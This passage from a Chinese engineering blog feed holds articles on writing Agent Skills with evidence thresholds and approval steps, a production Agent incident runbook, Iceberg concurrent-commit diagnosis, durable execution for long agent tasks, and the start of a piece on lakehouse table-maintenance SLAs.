<h2 id="把专家判断拆成证据门槛"><a href="#把专家判断拆成证据门槛" class="headerlink" title="把专家判断拆成证据门槛"></a>把专家判断拆成证据门槛</h2><p>“先诊断再修改”仍然太抽象。需要写出诊断最少读取哪些事实、如何建立因果：对象 ID、版本、配置、日志窗口、调用链、业务结果；若怀疑参数，则固定其他条件做 A&#x2F;B；没有真实运行证据时，结论必须标为推断。</p>
<p>对于源码问题，Skill 可以要求给文件、方法、行号和调用链；对于 SQL 等价改写，要求 schema、约束、NULL&#x2F;重复语义与 EXPLAIN；对于流式故障，要求原始 SSE、转换事件、持久化和客户端结果。不同领域的“证据”不是同一个模板。</p>
<p>停止条件也属于专业判断。连续三次相同失败且没有新信息，应停止相同重试；目标对象不唯一，不做有副作用操作；权限不足，不绕过审批；现场证据可能被覆盖，先保全再改配置。</p>
<p>Skill 不应把所有分支写成机械脚本。明确哪些事实必须有、哪些动作需要审批、什么结果算完成，把剩余判断留给模型。过度细化会在接口稍变时整体失效，过度抽象又无法约束行为。</p>
<h2 id="工具说明要包含风险和验证"><a href="#工具说明要包含风险和验证" class="headerlink" title="工具说明要包含风险和验证"></a>工具说明要包含风险和验证</h2><p>只列工具名称和参数，Agent 不知道哪个调用是只读、哪个会写数据。Skill 应标注工具副作用、幂等性、对象范围、前置权限、结果语义和失败恢复。<code>HTTP 200</code> 若只表示接受任务，就不能当成执行成功。</p>
<p>危险操作采用 resolve-preview-approve-execute-verify：先把用户自然语言解析成稳定对象，展示规范化参数和影响，获得绑定版本的批准，再执行并从业务系统核验。这里的审批是一条可审计 decision，远比弹出一句“确定吗”严格。</p>
<p>凭证不写入 Skill。它只说明应使用哪类连接和权限；运行环境通过 secret&#x2F;identity provider 注入短期凭证。把 token 复制进示例既容易泄漏，也会让 Skill 无法共享。</p>
<p>工具不可用时写降级路线：优先只读 API，其次受控浏览器，最后给用户可复制步骤；不能声称已经操作。降级后的验证能力若下降，也要在结果中说明。</p>
<h2 id="指令正文应短，资料与脚本按需加载"><a href="#指令正文应短，资料与脚本按需加载" class="headerlink" title="指令正文应短，资料与脚本按需加载"></a>指令正文应短，资料与脚本按需加载</h2><p>入口文件只保留每次都需要的规则和资源路由。大段 API 文档、领域字典和示例移到 references，根据任务读取；确定性强的检查、格式转换和批处理放 scripts。这样上下文里留下的是本次真正相关的约束。</p>
<p>引用资料要标适用版本。Kubernetes、MCP、云 API 的参数会变，Skill 如果永远指向 current 文档，半年后的历史任务可能被新语义误导。对生产工具最好绑定版本化 schema，并在不兼容时明确失败。</p>
<p>脚本不是免审的捷径。检查参数、固定工作目录、避免输出 secret，破坏性动作默认 dry-run 或要求明确目标。脚本输出结构化结果，让 Agent 能判断成功、部分成功与未知，而不是只看退出码。</p>
<p>示例应覆盖正常路径和边界失败，不要只放一个完美案例。最有价值的示例往往是同名对象、多租户权限不足、工具超时后状态不明、已有用户改动不能覆盖。</p>
<h2 id="用任务回放而不是主观感觉评-Skill"><a href="#用任务回放而不是主观感觉评-Skill" class="headerlink" title="用任务回放而不是主观感觉评 Skill"></a>用任务回放而不是主观感觉评 Skill</h2><p>我会保存真实任务的脱敏集合，包括正例、近邻任务、危险操作和故障注入。每次修改 Skill 后，对固定模型、工具 fixture 和环境回放，检查路由、证据读取、动作范围、停止条件和最终验证。</p>
<p>评测不能只看答案文风。Skill 的核心指标是：是否选对对象、是否调用允许的工具、是否在证据不足时停下、是否避免越权、是否完成真实结果核验。可以写得很好看却改错生产对象，这种结果应直接失败。</p>
<p>失败样本要回到具体规则。若反复把页面状态当执行结果，补结果语义与验证步骤；若触发范围抢了别的任务，改 description 和路由样本；若上下文过长导致关键约束被忽略，做分层加载。不要每次都加一句更强烈的“必须”。</p>
<p>Skill 有 owner、版本、变更说明和兼容范围。上线先 canary，观察工具拒绝、人工纠正和任务成功；发现回归可回退到旧版本。它是运行资产，不是个人提示词收藏。</p>
<p>把隐性经验写成 Skill，真正难的是承认边界：知道什么证据足够，什么动作不能替用户决定，什么结果还没有验证。边界越清楚，Agent 才越像一个可靠的工程协作者，而不是一个口吻自信的万能助手。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://agentskills.io/specification">Agent Skills Specification</a></li>
<li><a href="https://modelcontextprotocol.io/specification/2025-11-25/server/tools">MCP Tools：发现与调用工具的协议语义</a></li>
<li><a href="https://sre.google/sre-book/effective-troubleshooting/">Google SRE Book：有效故障排查</a></li>
<li><a href="https://airc.nist.gov/airmf-resources/playbook/">NIST AI RMF Playbook</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Agent Skill</tag>
        <tag>工程规范</tag>
        <tag>操作边界</tag>
      </tags>
  </entry>
  <entry>
    <title>生产 Agent 需要怎样的故障运行手册：先按症状止损，再沿证据定位</title>
    <url>//2026/01/22/production-agent-runbook/</url>
    <content><![CDATA[<p>传统服务报错，值班同学通常先看接口、实例和依赖。Agent 出问题时，表面症状更混乱：用户说“一直转圈”，可能是模型仍在生成、工具卡住、SSE 丢了终态，也可能任务已经完成但结果没有持久化。</p>
<p>运行手册不能按团队组件来写成“模型篇、向量库篇、MCP 篇”。值班者首先拿到的是用户症状和一个时间点。我更愿意从结果状态出发，先确认影响与副作用，再沿 Run 的证据链定位归属。</p>
<p class="article-diagram-scroll"><img src="/images/articles/production-agent-runbook.svg" class="lazyload" data-srcset="/images/articles/production-agent-runbook.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="生产 Agent 故障运行手册分流"></p>
<span id="more"></span>

<h2 id="第一页只放十分钟内要做的事"><a href="#第一页只放十分钟内要做的事" class="headerlink" title="第一页只放十分钟内要做的事"></a>第一页只放十分钟内要做的事</h2><p>Runbook 开头不是系统架构，而是一份现场检查单：受影响租户与任务类型、首次发生时间、错误比例、是否仍有写操作在运行、近期发布和策略变更、已知安全影响。没有这些事实，直接重启只会销毁现场。</p>
<p>先取得 <code>run_id/request_id/trace_id</code> 中至少一个。如果用户只提供页面和时间，用租户、会话与时间窗口反查，但必须把检索范围写清楚。截图中的一句错误不能代替服务端事件；一个 HTTP 200 也不能证明流式响应完整。</p>
<p>我会把症状分成五类：没有开始、执行中无进展、输出中断、结果错误、产生错误副作用。前四类仍要看风险，第五类立即冻结相关写工具或切换只读策略，保存 operation&#x2F;decision&#x2F;approval 证据，再讨论恢复。</p>
<p>止损动作要预先分级：关闭某个高风险 tool version、把路由切回已验证模型、暂停新 Run、限制单租户流量、保留查询但禁止执行。不要只给一个“关闭 Agent”总开关，也不要让值班人员现场猜配置键。</p>
<h2 id="沿-Run、Step、Attempt、Operation-查"><a href="#沿-Run、Step、Attempt、Operation-查" class="headerlink" title="沿 Run、Step、Attempt、Operation 查"></a>沿 Run、Step、Attempt、Operation 查</h2><p>Run 是用户任务，Step 是计划中的工作单元，Attempt 是一次模型或活动尝试，Operation 是外部副作用。运行手册给出四层的查询入口和判定字段，而不是让人跨十个系统手工拼时间线。</p>
<p>Run 层看 bundle&#x2F;version、deadline、budget、terminal state 与最终产物；Step 看依赖、调度与等待原因；Attempt 看模型请求、流事件、finish、usage 与重试；Operation 看规范化参数、idempotency key、权限决定和真实业务结果。</p>
<p>“卡住”要有可计算定义。比如 <code>last_progress_at</code> 超过任务桶阈值、无活动 Worker lease、仍有未决审批、外部异步任务未回调。不同原因对应不同动作：等待审批不该重试模型，Worker 丢 lease 可安全重新领取，业务状态不明则先 reconciliation。</p>
<p>“断流”检查完整事件序列：是否有 response created、内容增量、tool call arguments complete、tool result、message&#x2F;output done 和 terminal event。代理层 499、网关超时、客户端取消、provider 终止要分开。只查应用日志里最后一行，容易把客户端断开误认为模型失败。</p>
<h2 id="每个操作都写清安全恢复条件"><a href="#每个操作都写清安全恢复条件" class="headerlink" title="每个操作都写清安全恢复条件"></a>每个操作都写清安全恢复条件</h2><p>Runbook 中的命令必须标注只读、可逆或有副作用，并写前置检查和成功信号。例如“重放流事件”是只读；“重试模型 attempt”会产生费用但通常无业务副作用；“重试工具 operation”可能重复发消息或改数据，必须先查幂等结果。</p>
<p>我不接受“重启后观察”这种恢复步骤。重启哪个组件、为什么能解除什么状态、会丢失哪些内存信息、如何确认积压下降，都要写。若问题来自 schema 不兼容，扩容与重启只会更快地产生失败。</p>
<p>补偿动作同样要具体。错误提交任务后，是停止尚未运行的实例、取消运行中实例、还是对已写数据回滚；每种状态由谁确认，何时允许恢复入口流量。补偿失败不能覆盖原始失败，应产生关联 Operation。</p>
<p>恢复门槛采用用户结果：新 canary Run 通过、终态完整、工具业务结果一致、错误率回到基线、积压可消化，并持续一个明确观察窗口。单个 Pod Ready 或接口 200 只是组件信号。</p>
<h2 id="常见症状要有固定的证据表"><a href="#常见症状要有固定的证据表" class="headerlink" title="常见症状要有固定的证据表"></a>常见症状要有固定的证据表</h2><p>“回答明显错误”先固定输入 Bundle、检索 chunks、工具原始结果、模型原始输出与最终转换。若工具事实正确而答案错，看生成与引用；若工具选错对象，看实体解析和目录；若页面错而持久化结果正确，看流式转换与前端组装。</p>
<p>“重复执行”查 operation idempotency key、attempt 边界、超时窗口和消费者 offset。没有新 Operation ID 的重复可能是下游未幂等；产生多个 ID 则多半是编排层把一次逻辑步骤当成多次新操作。</p>
<p>“权限异常”同时查主体委托链、资源对象、参数、policy snapshot、decision reason、审批绑定与工具端授权。Agent 层说 allowed、业务端 403，可能是 token audience、身份映射或对象级权限，而不是简单的“权限缓存”。</p>
<p>“成本暴涨”按成功与失败路径拆 attempts、重复上下文、检索、工具、沙箱与人工接管。总 token 上升只是现象；如果根因是 SSE 终态丢失造成全量重跑，先修协议而不是强行缩短回答。</p>
<h2 id="Runbook-也要参加发布和演练"><a href="#Runbook-也要参加发布和演练" class="headerlink" title="Runbook 也要参加发布和演练"></a>Runbook 也要参加发布和演练</h2><p>手册与代码放同一仓库，标 owner、适用版本、最后演练时间和依赖仪表盘。接口、字段或配置变化时，发布检查要求同步更新。链接失效和命令过期，应当像测试失败一样暴露。</p>
<p>每月用故障注入演练一两个路径：模型超时、MCP 返回非法 schema、Worker 在副作用后崩溃、SSE 丢 terminal、权限服务不可用。让非作者值班并记录卡点，才能发现手册里默认了多少隐性知识。</p>
<p>事故结束后，Runbook 不只新增一条错误码。要提炼最早可观察信号、最小止损范围、缺失证据、无效操作与可自动化诊断。重复出现且判定稳定的步骤进入平台，留给人的应该是需要判断的分叉。</p>
<p>一份好运行手册不会假装 Agent 故障都能一键修复。它让现场先知道发生了什么、哪些动作安全、什么时候可以恢复，以及证据不足时该停在哪里。这比“多重试几次”可靠得多。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://sre.google/workbook/incident-response/">Google SRE Workbook：Incident Response</a></li>
<li><a href="https://sre.google/sre-book/effective-troubleshooting/">Google SRE Book：Effective Troubleshooting</a></li>
<li><a href="https://opentelemetry.io/docs/specs/otel/logs/">OpenTelemetry Logs：Trace 与 Log 的关联</a></li>
<li><a href="https://aws.amazon.com/builders-library/avoiding-insurmountable-queue-backlogs/">AWS Builders’ Library：Avoiding insurmountable queue backlogs</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>故障诊断</tag>
        <tag>可观测性</tag>
        <tag>Runbook</tag>
      </tags>
  </entry>
  <entry>
    <title>湖仓并发写入为什么要从提交冲突诊断：重试不是统一答案</title>
    <url>//2026/05/16/lakehouse-concurrent-commit/</url>
    <content><![CDATA[<p>湖仓写任务报 <code>CommitFailed</code>，最常见的处理是调高重试次数。这对一部分并发 append 有效，对 overwrite、delete 或 compaction 却可能掩盖真正的语义冲突。更麻烦的是提交超时：客户端认为失败，Catalog 可能已经成功切换了元数据。</p>
<p>诊断并发写入，不能只看异常类名。我会把一次写拆成数据文件生成、基于某个 snapshot 规划变更、冲突校验、Catalog 原子提交和提交结果确认五段，先判断失败发生在哪一段，再决定复用文件、重新规划还是人工核对。</p>
<p class="article-diagram-scroll"><img src="/images/articles/lakehouse-concurrent-commit.svg" class="lazyload" data-srcset="/images/articles/lakehouse-concurrent-commit.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Iceberg 并发提交诊断路径"></p>
<span id="more"></span>

<h2 id="乐观并发保护的是元数据提交"><a href="#乐观并发保护的是元数据提交" class="headerlink" title="乐观并发保护的是元数据提交"></a>乐观并发保护的是元数据提交</h2><p>Iceberg writer 从基准 snapshot&#x2F;metadata version 出发，写出 data&#x2F;delete files 与 manifest，再构造新 metadata，最后通过 Catalog 的 compare-and-swap 原子更新当前指针。两个 writer 可以并行准备，只有提交点需要竞争。</p>
<p>这意味着“发生并发”并不必然失败。纯 append 通常可以在刷新表状态后复用已写文件，把新增 manifest 重新挂到最新元数据树上。重试成本远低于重跑整个计算任务，这也是提交层重试值得存在的地方。</p>
<p>但原子指针只防止静默覆盖，不自动证明业务语义仍成立。Writer 基于 snapshot S 计算“覆盖日期 D”，期间另一个 writer 已修改 D；如果无条件把旧计划重放到新 snapshot，可能删除对方刚写入的数据。</p>
<p>因此日志至少保留 table identifier、branch、base snapshot&#x2F;metadata location、operation type、isolation、conflict filter、new&#x2F;deleted file counts、attempt、commit UUID 与 Catalog request ID。只有一句“版本不一致”无法判断哪些数据相交。</p>
<h2 id="先区分四种冲突"><a href="#先区分四种冲突" class="headerlink" title="先区分四种冲突"></a>先区分四种冲突</h2><p>第一种是 Catalog compare-and-swap 竞争。当前元数据指针被别人推进，但你的语义校验仍可能成立。这类错误刷新表后重建元数据并有限重试，常见于并发 append。</p>
<p>第二种是 validation conflict。Overwrite&#x2F;Delete&#x2F;RowDelta 所依赖的数据范围已经变化，例如冲突 filter 内出现新 data file 或原计划删除的文件不再有效。这不是基础设施瞬断，而是旧假设被并发写破坏。需要重新读取新 snapshot、重新计算或让上层决定合并语义。</p>
<p>第三种是 commit state unknown。Catalog 请求超时、连接断开或服务端在响应前重启，客户端不知道提交是否成功。此时直接用新 commit UUID 再写，可能重复数据。先按 commit UUID、snapshot summary、metadata location 查询，确认成功、未发生或仍不可判定。</p>
<p>第四种是数据文件阶段失败。写出的文件未进入任何 snapshot，可能形成 orphan；它与元数据并发冲突不是一回事。重试前要知道文件是否可复用、是否被其他提交引用，清理由保守保留期的 orphan 任务处理，不能现场随手删除。</p>
<h2 id="Operation-类型决定验证条件"><a href="#Operation-类型决定验证条件" class="headerlink" title="Operation 类型决定验证条件"></a>Operation 类型决定验证条件</h2><p>Append 通常只要求不覆盖已有文件，竞争后可把新增文件并入最新状态。但同一业务批次若重复执行，Iceberg 不会替业务自动去重。应用仍需要 batch&#x2F;job ID、源 offset 或业务唯一键来识别重复提交。</p>
<p>Dynamic overwrite 按写入结果涉及的分区替换，期间新增到相同分区的数据可能与原意冲突；static overwrite 的范围更大，风险也更高。提交日志必须留实际 conflict filter，不要只写 <code>INSERT OVERWRITE</code>。</p>
<p>Merge&#x2F;Delete&#x2F;Update 依赖扫描到的 data&#x2F;delete files。并发 append 是否冲突与 isolation level、过滤范围和 validator 有关。重试若重新扫描，得到的结果可能改变；这应被视为新的 planning attempt，而不是透明网络重试。</p>
<p>Compaction 虽然主要重写文件，也是一位 writer。它要确认准备替换的源文件仍存在，并避免与业务 overwrite&#x2F;delete 互相破坏。把 compaction 当纯后台 IO，不设并发预算和冲突策略，会在高峰期持续抢提交。</p>
<h2 id="重试策略要看是否取得新事实"><a href="#重试策略要看是否取得新事实" class="headerlink" title="重试策略要看是否取得新事实"></a>重试策略要看是否取得新事实</h2><p>提交层重试包含 refresh、validate、rebase&#x2F;build metadata、commit，并使用指数退避和抖动。每次 attempt 记录 base&#x2F;current snapshot 差异。如果当前状态没变化而相同错误重复，继续重试通常没有价值。</p>
<p>语义冲突不能靠把重试次数从 4 调成 100。重新规划前，作业要确认源输入是否可重放、写入文件是否能安全回收、业务时间窗是否仍有效。流式 sink 还要结合 checkpoint ID，避免恢复时重复提交已完成 checkpoint。</p>
<p>unknown state 的恢复优先 reconciliation：扫描近期 snapshots 的 summary&#x2F;commit token，检查文件集合和业务批次标识。确认已提交就把本地状态推进；确认未提交才重试；证据仍不够，暂停同批次写入并告警。</p>
<p>提交退避不能无限占用集群资源。大量 writer 同时刷新和重试会形成提交风暴。按表&#x2F;分区限制并发，maintenance 与业务写分配窗口，监控 attempts per commit、validation failure、unknown duration 和 commit latency。</p>
<h2 id="用时间线还原现场"><a href="#用时间线还原现场" class="headerlink" title="用时间线还原现场"></a>用时间线还原现场</h2><p>我排查时先列表 snapshot 时间线：每次提交的 operation、parent、summary、files、writer&#x2F;job&#x2F;checkpoint。再把失败 writer 的 base snapshot 和 conflict filter 叠上去，看在它规划后到底插入了哪些提交。</p>
<p>如果所有失败都集中在一个 Catalog，检查 CAS&#x2F;锁实现、元数据可见性和对象存储一致性；如果只发生在相同分区的 overwrite，先看业务并发编排；如果 compaction 开启后陡增，看 rewrite group 与业务写的重叠。</p>
<p>修复验证用两个受控 writer 制造确定冲突：并发 append 应有限重试成功且无重复；同范围 overwrite 应按策略拒绝或重算；提交响应丢失后应通过 commit token 找到结果；compaction 与 delete 不得复活已删除行。</p>
<p>还要验证读结果，而不只是两个任务都显示成功。按业务主键&#x2F;批次、snapshot 增量和文件引用核对，并确认没有未引用文件被过早删除。</p>
<p>湖仓的原子提交解决了“不能把彼此的元数据静默覆盖”，没有替业务定义所有并发语义。把冲突类型、操作假设和提交状态查清楚，重试才是恢复机制；否则它只是把竞态再执行几遍。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://iceberg.apache.org/docs/1.8.0/reliability/">Apache Iceberg Reliability：并发写与乐观并发</a></li>
<li><a href="https://iceberg.apache.org/spec/#table-metadata">Apache Iceberg Spec：Table Metadata</a></li>
<li><a href="https://iceberg.apache.org/docs/latest/spark-writes/">Apache Iceberg Spark Writes：Isolation Level 与写操作</a></li>
<li><a href="https://aws.amazon.com/builders-library/making-retries-safe-with-idempotent-APIs/">AWS Builders’ Library：Making retries safe with idempotent APIs</a></li>
</ul>
]]></content>
      <categories>
        <category>湖仓架构</category>
      </categories>
      <tags>
        <tag>故障诊断</tag>
        <tag>Apache Iceberg</tag>
        <tag>并发提交</tag>
      </tags>
  </entry>
  <entry>
    <title>长任务为什么需要 Durable Execution：别把 Agent 状态押在一次 HTTP 连接上</title>
    <url>//2025/12/03/agent-durable-execution/</url>
    <content><![CDATA[<p>把一个需要四十分钟的研究任务放在普通接口里跑，我最担心的不是模型慢，而是执行状态只活在进程内存里。网关超时、Pod 重启、SSE 断开，系统便不知道搜索做到哪一步、哪个工具已经产生副作用，只能从头再来。</p>
<p>数据调度系统早就处理过这类问题。长任务不能依赖一条不断开的连接，必须把一次执行表达成可恢复的状态机。Agent 场景多了模型输出和动态工具选择，基本原则没有变：决定要留下，副作用要有身份，恢复要从事实继续。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-durable-execution.svg" class="lazyload" data-srcset="/images/articles/agent-durable-execution.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent 持久执行与恢复路径"></p>
<span id="more"></span>

<h2 id="先分清客户端会话和后台-Run"><a href="#先分清客户端会话和后台-Run" class="headerlink" title="先分清客户端会话和后台 Run"></a>先分清客户端会话和后台 Run</h2><p>HTTP 请求负责提交任务，不负责承载任务的全部生命期。服务端接受请求后生成 <code>run_id</code>，固化输入、调用身份、工作流版本、权限快照和预算，再把 Run 放进持久队列。客户端可通过事件流观察，也可断线后凭 <code>run_id</code> 查询。</p>
<p>我会明确区分三种状态：连接状态、Run 状态和业务结果。浏览器显示“已断开”只说明传输断了；Worker 显示“完成”不代表产物通过验证；工具返回 200 也不代表业务副作用成功。把三者塞进一个 <code>status</code> 字段，恢复和告警都会误判。</p>
<p>Run 状态至少包括 <code>queued/running/waiting_approval/waiting_external/succeeded/failed/cancelled/unknown</code>。<code>unknown</code> 很重要：进程在确认工具结果前崩溃时，平台不能武断地标成失败，更不能立即重做有副作用的操作。</p>
<p>SSE 是观察通道，不是事实库。事件先进入持久历史，再投递给在线客户端；客户端带上最后确认的序号重连。若先推流、后落库，正好在两者之间崩溃，就会出现用户看见过、恢复后却不存在的幽灵步骤。</p>
<h2 id="Event-History-保存决定，不保存进程快照"><a href="#Event-History-保存决定，不保存进程快照" class="headerlink" title="Event History 保存决定，不保存进程快照"></a>Event History 保存决定，不保存进程快照</h2><p>可恢复执行的核心是记录足以重放决策的事件：Run 创建、Step 调度、模型 Attempt 开始和结束、工具 Operation 提交和确认、审批决定、计时器触发、补偿结果。序列化整个 Python 或 Java 堆既脆弱，也解决不了外部副作用。</p>
<p>每条事件带单调序号、事件类型、时间、关联 step&#x2F;attempt&#x2F;operation、输入输出引用和校验摘要。大文件放对象存储，历史里存不可变引用；敏感字段按策略脱敏或加密，不能为了“可观测”把 token、密码和整份数据复制进日志。</p>
<p>重放不等于重新请求模型。模型具有非确定性，外部搜索结果也会变化。恢复时重建已经发生的状态，只对未完成的决定继续执行。若确实需要重算，生成新的 attempt，并保留它为什么替代旧 attempt 的关系。</p>
<p>工作流代码要尽量确定：相同历史得到相同下一状态。当前时间、随机数、配置读取和特性开关不能在重放时偷偷变化，要么形成事件，要么固定在 Run Bundle。否则代码升级后，同一份历史可能走出另一条分支。</p>
<h2 id="工具副作用靠幂等键守住"><a href="#工具副作用靠幂等键守住" class="headerlink" title="工具副作用靠幂等键守住"></a>工具副作用靠幂等键守住</h2><p>恢复最危险的窗口是“工具已经执行，但完成事件还没写入”。发消息、提交工单、执行 DDL、触发数据任务都可能重复。平台必须为每个工具操作分配稳定的 <code>operation_id</code> 或 idempotency key，并贯穿 Agent、MCP 服务和业务系统。</p>
<p>工具端保存这个键与结果。重复请求若参数摘要相同，返回第一次结果；若键相同而参数不同，直接冲突。不能支持幂等键的系统，需要在调用前后用业务唯一键查询，并把结果分为 <code>confirmed/not_found/ambiguous</code>。<code>ambiguous</code> 进入人工核验，不能靠自动重试碰运气。</p>
<p>只读查询也不是无限重试。慢查询会占用资源，外部检索可能计费，读到的版本还可能不同。我会给 activity 配置最大 attempts、退避、超时和不可重试错误；参数校验失败、权限拒绝通常不靠相同参数重试解决。</p>
<p>补偿不等于数据库回滚。已经发出的通知无法真正撤销，可以再发更正；已经提交的任务可尝试取消，但可能早已开始。工作流应记录补偿语义和可逆等级，不要用一个万能 <code>rollback()</code> 掩盖现实。</p>
<h2 id="审批等待不是占住一个线程"><a href="#审批等待不是占住一个线程" class="headerlink" title="审批等待不是占住一个线程"></a>审批等待不是占住一个线程</h2><p>生产 Agent 经常在高风险步骤前等待人确认。等待可能持续几小时甚至几天，此时释放 Worker，把 <code>approval_requested</code> 写入历史。审批请求包含待执行对象、参数摘要、风险、权限依据、过期时间与计划版本；人的决定成为新事件，再唤醒执行。</p>
<p>恢复时必须重新检查容易变化的前置条件。审批通过的是“当时展示的操作”，不是一张永久通行证。如果目标资源版本、参数或权限发生变化，旧审批失效，重新生成 diff。否则用户批准删除 A，Agent 恢复后却按新计划删除 B。</p>
<p>定时等待和外部回调也一样。Timer 写入持久队列，回调以业务关联键落到 Run；重复、乱序和过期回调都要处理。靠 Worker <code>sleep()</code> 或内存 Promise 等待，在滚动发布后迟早丢状态。</p>
<p>取消采用协作式语义：Run 进入 cancelling，停止派发新 Step，对运行中的活动发送取消；已发生的副作用记录清楚。前端显示“已取消”之前，应知道哪些操作已确认、哪些仍在取消中，不能给用户一个虚假的瞬时终态。</p>
<h2 id="版本升级要能重放旧历史"><a href="#版本升级要能重放旧历史" class="headerlink" title="版本升级要能重放旧历史"></a>版本升级要能重放旧历史</h2><p>长任务跨过发布窗口很常见。新版代码若删除状态、改变分支条件或更换工具名称，旧历史可能无法继续。我会把 workflow version、prompt&#x2F;tool schema、model snapshot 和 policy version 固化在 Bundle 中，并为状态迁移留显式版本标记。</p>
<p>发布前拿生产脱敏历史做 replay test：旧事件输入新版状态机，不能产生未记录的新决定，也不能卡在不存在的状态。需要改变行为时，用 version marker 让旧 Run 走旧分支，新 Run 走新分支，而不是在代码里猜历史时间。</p>
<p>活动接口也要兼容。工具升级后仍应接受旧 Operation 的恢复查询，或者提供迁移适配层。删掉旧模型、旧 prompt 并不只影响新请求，可能让一批等待审批的 Run 无法继续。</p>
<p>我判断 Durable Execution 是否做对，会做四个注入实验：模型返回后杀 Worker、工具提交后断网、审批等待中滚动升级、SSE 客户端反复重连。验收要同时满足没有重复副作用、历史顺序可解释、恢复点正确、终态只有一次，不能停在“最终好像成功”。</p>
<p>长任务的可靠性最终来自可持久的事实，而不是更长的超时。连接可以断，进程可以换，代码可以升级；只要决定、操作身份和版本边界都留下，Agent 才能在真实环境里继续走完。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://docs.temporal.io/temporal">Temporal：Durable Execution 的工作方式</a></li>
<li><a href="https://aws.amazon.com/builders-library/making-retries-safe-with-idempotent-APIs/">AWS Builders’ Library：Making retries safe with idempotent APIs</a></li>
<li><a href="https://opentelemetry.io/docs/specs/otel/trace/api/">OpenTelemetry Trace API：Span、Event、Status 的语义</a></li>
<li><a href="https://platform.openai.com/docs/guides/background">OpenAI Responses API：后台执行与状态查询</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Durable Execution</tag>
        <tag>任务状态机</tag>
        <tag>故障恢复</tag>
      </tags>
  </entry>
  <entry>
    <title>表维护任务为什么也要进入 SLA：小文件、快照和孤儿文件都是运行负债</title>
    <url>//2026/05/18/table-maintenance-sla/</url>
    <content><![CDATA[<p>湖仓表“每天数据都写成功”，不代表它运行健康。流式任务持续产生小文件，快照和 manifest 逐渐膨胀，失败作业留下未引用文件。查询开始变慢、Catalog 元数据增大时，团队才临时跑一次全表 compaction。</p>
<p>这种做法把表维护当清洁脚本，实际上它和写入、查询一样是持续服务。维护延迟会积累运行负债，维护过猛又会抢资源、制造提交冲突甚至误删在途文件。它需要自己的 SLI、SLO、容量和变更治理。</p>
<p class="article-diagram-scroll"><img src="/images/articles/table-maintenance-sla.svg" class="lazyload" data-srcset="/images/articles/table-maintenance-sla.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="湖仓表维护 SLA 闭环"></p>
<span id="more"></span>

<h2 id="不同维护任务解决不同负债"><a href="#不同维护任务解决不同负债" class="headerlink" title="不同维护任务解决不同负债"></a>不同维护任务解决不同负债</h2><p>Rewrite data files 合并小文件，改善文件打开、扫描并行度和元数据规模；rewrite manifests 调整 manifest 组织，减少规划阶段读取；expire snapshots 缩短历史链并删除不再引用的数据；remove orphan files 清理从未进入有效 metadata 的残留。</p>
<p>四者不能用一个“Optimize”按钮替代。Compaction 生成新 snapshot，也会增加提交和临时空间；快照过期影响 time travel 与回滚窗口；孤儿清理要扫描存储并承担误删风险；manifest rewrite 的收益取决于分区和查询过滤。</p>
<p>我会为每张表记录 maintenance profile：写入模式、目标文件大小、查询热点、快照保留、最大作业时长、流式 checkpoint&#x2F;commit 频率、分支&#x2F;tag 使用、存储路径规范和业务恢复要求。</p>
<p>Profile 由表等级模板继承，再允许少量显式覆盖。让每个团队随手填写十几个参数，最后只会得到无法治理的配置森林。</p>
<h2 id="SLI-要反映用户感受到的退化"><a href="#SLI-要反映用户感受到的退化" class="headerlink" title="SLI 要反映用户感受到的退化"></a>SLI 要反映用户感受到的退化</h2><p>小文件 SLI 不只看平均大小。P50 很正常时，长尾分区可能有几万文件。按活跃分区统计 file count、bytes&#x2F;file 分位、delete file ratio，以及最近 N 个 snapshots 新增文件速率。</p>
<p>元数据 SLI 包括 manifest count&#x2F;bytes、planning latency、metadata JSON 数量、snapshot count&#x2F;age。查询侧结合 file open 数、scan planning time、实际扫描文件与数据量。仅用存储成本无法解释用户为什么查询慢。</p>
<p>清理 SLI 看 oldest eligible snapshot、expired-but-not-deleted files、orphan candidate age&#x2F;bytes、last successful run 和连续失败次数。候选不等于可安全删除，指标名称要避免让运维误解。</p>
<p>SLO 可以写成：P1 表活跃分区小文件负债在 6 小时内回落，快照保留满足至少 7 天且不少于 N 个，规划延迟不超过基线，orphan 候选在安全窗口后 72 小时内清理。具体值来自业务而不是主题默认值。</p>
<h2 id="触发应该由数据和预算共同决定"><a href="#触发应该由数据和预算共同决定" class="headerlink" title="触发应该由数据和预算共同决定"></a>触发应该由数据和预算共同决定</h2><p>固定每天凌晨跑全表简单，但流量增长后容易撞上业务高峰，也会反复扫描没有变化的分区。我倾向用 commit count、new file count&#x2F;bytes、partition heat、manifest growth 和最大间隔共同触发。</p>
<p>Compaction 先选候选文件组，限制单次 rewrite bytes、分区数、并发和运行时。大的积压分批完成并记录 partial progress，避免一次超大任务失败后全部重来。收益低于最小阈值的文件组不重写。</p>
<p>维护调度器要有 per-table lock 或协调机制，同类动作串行，和业务 writer 使用不同优先级&#x2F;资源池。全局再设 IO、CPU、Catalog commit 与对象存储请求预算，防止几千张表整点同时启动。</p>
<p>失败退避基于原因。提交竞争可换窗口或缩小 rewrite group；读取文件失败先查存储；权限和路径问题不会靠重试恢复。连续失败使表进入 degraded，并把积压增长纳入告警。</p>
